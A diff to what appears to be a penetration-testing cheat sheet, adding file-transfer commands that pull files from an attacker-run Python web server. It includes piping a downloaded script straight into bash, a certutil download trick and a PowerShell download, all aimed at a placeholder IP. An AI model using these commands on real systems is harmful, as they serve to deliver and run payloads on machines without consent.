@@ -724,12 +724,16 @@ sudo python3 -m http.server {PORT}
 # Download: Pre-installed on Kali Linux
 
 # Usage - Download on server machine
-wget http://{IP ADDRESS}/{FILE} -outfile {FILE}
+wget {IP ADDRESS}/{FILE} -outfile {FILE}
+curl {IP ADDRESS}/{FILE}
 
-# Download file and execute in bash:
+# Linux - Download file and execute in bash:
 curl {IP ADDRESS}/{FILE.sh} | bash
 
-# Download file using powershell
+# Windows - Download file using certutil
+certutil -split -f -urlcache http://{IP ADDRESS}/{FILE}
+
+# Windows - Download file using powershell
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://{IP ADDRESS}/{FILE.exe}','C:\Users\{USER}\{FILE.exe}')"
 
 # {IP ADDRESS}: IP Address of the client from step one (python server)
